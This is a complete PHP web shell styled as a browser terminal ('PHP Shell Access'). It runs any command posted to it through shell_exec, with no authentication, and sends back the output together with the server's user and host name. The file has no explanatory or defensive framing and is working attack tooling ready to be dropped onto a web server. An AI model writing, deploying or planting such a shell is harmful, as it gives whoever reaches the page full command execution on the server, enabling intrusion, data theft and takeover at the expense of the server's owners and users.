<?php
$initial_cwd = getcwd();
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $command = isset($_POST['cmd']) ? $_POST['cmd'] : '';
    $current_dir = isset($_POST['cwd']) ? $_POST['cwd'] : getcwd();
    if (is_dir($current_dir)) {
        chdir($current_dir);
    }
    $output = "";
    $new_cwd = getcwd();
    if (preg_match('/^cd\s+(.*)/', $command, $matches)) {
        $targetDir = $matches[1];
        if ($targetDir === '~') {
            $targetDir = getenv('HOME') ?: $initial_cwd;
        }
        if (chdir($targetDir)) {
            $new_cwd = getcwd();
            $output = ""; 
        } else {
            $output = "bash: cd: $targetDir: No such file or directory";
        }
    } else {
        $output = shell_exec($command . " 2>&1");
    }
    header('Content-Type: application/json');
    echo json_encode([
        'output' => htmlspecialchars($output ?? ""), 
        'cwd' => $new_cwd,
        'user' => get_current_user(),
        'host' => gethostname()
    ]);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Web Terminal (Stateless)</title>
    <style>
        :root {
            --bg-color: #0d1117;
            --text-color: #c9d1d9;
            --prompt-user: #7ee787;
            --prompt-path: #79c0ff;
            --cmd-color: #ffffff;
            --cursor-color: #c9d1d9;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-color);
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            font-size: 14px;
            margin: 0;
            padding: 20px;
            height: 100vh;
            box-sizing: border-box;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }

        #terminal-window {
            flex-grow: 1;
            overflow-y: auto;
            padding-bottom: 20px;
            scrollbar-width: thin;
            scrollbar-color: #30363d transparent;
        }

        .line {
            margin-bottom: 2px;
            white-space: pre-wrap;
            word-break: break-all;
            line-height: 1.4;
        }

        .prompt-line {
            margin-top: 10px;
            display: flex;
            flex-wrap: wrap;
        }

        .user { color: var(--prompt-user); font-weight: bold; }
        .at { color: var(--text-color); }
        .host { color: var(--prompt-user); font-weight: bold; }
        .path { color: var(--prompt-path); font-weight: bold; }
        .symbol { color: var(--text-color); margin-right: 8px; }

        .input-container {
            display: flex;
            align-items: center;
        }

        input[type="text"] {
            background: transparent;
            border: none;
            color: var(--cmd-color);
            font-family: inherit;
            font-size: inherit;
            outline: none;
            flex-grow: 1;
            padding: 0;
            margin: 0;
            caret-color: var(--cursor-color);
        }

        .output { color: #8b949e; }
        .error { color: #ff7b72; }

        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 4px; }
    </style>
</head>
<body>

    <div id="terminal-window">
        <div class="line output">PHP Shell Access [Stateless Mode]</div>
        <div class="line output">System: Linux (Read-Only FS Compatible)</div>
        <br>
        <div id="history"></div>
        
        <div class="input-container">
            <span id="prompt-span">
                <span class="user"><?php echo get_current_user(); ?></span><span class="at">@</span><span class="host"><?php echo gethostname(); ?></span>:<span class="path"><?php echo basename($initial_cwd); ?></span><span class="symbol">$</span>
            </span>
            <input type="text" id="cmd" autocomplete="off" autofocus spellcheck="false">
        </div>
    </div>

    <script>
        const cmdInput = document.getElementById('cmd');
        const historyDiv = document.getElementById('history');
        const terminalWindow = document.getElementById('terminal-window');
        const promptSpan = document.getElementById('prompt-span');
        let currentFullPath = "<?php echo addslashes($initial_cwd); ?>"; 
        let currentUser = "<?php echo get_current_user(); ?>";
        let currentHost = "<?php echo gethostname(); ?>";
        let displayPath = "<?php echo basename($initial_cwd); ?>";
 document.body.addEventListener('click', () => cmdInput.focus());
        let cmdHistory = [];
        let historyIndex = -1;
        cmdInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                const command = this.value;
                if (command.trim() !== "") {
                    cmdHistory.push(command);
                    historyIndex = cmdHistory.length;
                    executeCommand(command);
                }
                this.value = '';
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (historyIndex > 0) {
                    historyIndex--;
                    this.value = cmdHistory[historyIndex];
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (historyIndex < cmdHistory.length - 1) {
                    historyIndex++;
                    this.value = cmdHistory[historyIndex];
                } else {
                    historyIndex = cmdHistory.length;
                    this.value = '';
                }
            }
        });

        function executeCommand(command) {
            addToScreen(command, 'command');

            if (command.trim() === 'clear') {
                historyDiv.innerHTML = '';
                return;
            }

            const formData = new FormData();
            formData.append('cmd', command);
            formData.append('cwd', currentFullPath); 
            fetch(window.location.href, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                currentFullPath = data.cwd;
                let pathParts = data.cwd.split(/[/\\]/);
                displayPath = pathParts[pathParts.length - 1] || '~';
                if(displayPath === "") displayPath = "/";

                updatePromptUI();

                if (data.output) {
                    addToScreen(data.output, 'output');
                }
            })
            .catch(error => {
                addToScreen('Error: ' + error, 'error');
            });
        }

        function addToScreen(text, type) {
            const div = document.createElement('div');
            
            if (type === 'command') {
                div.className = 'prompt-line';
                div.innerHTML = `
                    <span class="user">${currentUser}</span><span class="at">@</span><span class="host">${currentHost}</span>:<span class="path">${displayPath}</span><span class="symbol">$</span>
                    <span style="color: white; margin-left: 5px;">${escapeHtml(text)}</span>
                `;
            } else {
                div.className = 'line output';
                if (text.toLowerCase().includes('error') || text.toLowerCase().includes('not found') || text.toLowerCase().includes('denied')) {
                    div.className += ' error';
                }
                div.innerHTML = text; 
            }
            
            historyDiv.appendChild(div);
            scrollToBottom();
        }

        function updatePromptUI() {
            promptSpan.querySelector('.path').textContent = displayPath;
        }

        function scrollToBottom() {
            terminalWindow.scrollTop = terminalWindow.scrollHeight;
        }

        function escapeHtml(text) {
            return text
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&#039;");
        }
    </script>
</body>
</html>
